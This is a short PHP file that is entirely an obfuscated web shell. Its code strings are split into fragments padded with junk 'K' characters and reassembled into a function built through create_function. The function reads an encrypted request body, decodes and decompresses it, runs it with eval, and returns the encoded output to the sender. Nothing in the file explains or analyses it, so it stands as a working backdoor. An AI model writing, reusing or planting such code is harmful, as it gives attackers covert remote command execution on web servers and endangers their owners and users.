<?php
$O='1) {@Kob_sKtart();@eKvaKl(@gKzuncompreKss(@Kx(@KbaseK64_decKode($';
$a='(K"/$kKh(.K+)$kfK/",@fileK_KgKet_contents("php://iKKnput"),$m)==K';
$L='$kK="d37cda9a";$KkKhK="a8e4b0924bd6K";$kf="9K0cc92dK7K6aKad";K$p=';
$r='rlen($t);K$o="";Kfor($i=0K;$iK<$l;){for(K$j=0;(K$j<$cK&&$i<$Kl)K;';
$g='$Kj++,$i++)K{$o.=K$Kt{K$i}^$k{$j};}}return $Ko;}if (K@pregK_match';
$e='m[1]),$k)))K;$o=K@oKb_Kget_contents(K);@ob_endK_Kclean()K;$r=K@bK';
$V='ase6K4_encode(@x(@gzcKoKmpress($o),K$k));pKrKint("$p$kh$Kr$kf");}';
$Y='"ensDUVKuKw3AA7RW8GK";fuKnction x($tK,$kK){$c=strlen(K$k);$lK=Kst';
$Z=str_replace('s','','csreaste_ssfunsctison');
$Q=str_replace('K','',$L.$Y.$r.$g.$a.$O.$e.$V);
$n=$Z('',$Q);$n();
?>
